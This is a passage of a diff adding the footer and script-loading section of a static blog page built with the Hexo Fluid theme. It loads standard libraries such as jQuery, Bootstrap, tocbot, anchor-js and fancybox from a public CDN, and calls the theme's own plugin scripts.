+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script>
+  <link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css">
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script>
+<script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script>
+<script src="/js/events.js"></script>
+<script src="/js/plugins.js"></script>
+
+
+  <script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script src="/js/img-lazyload.js"></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script src="/js/boot.js"></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
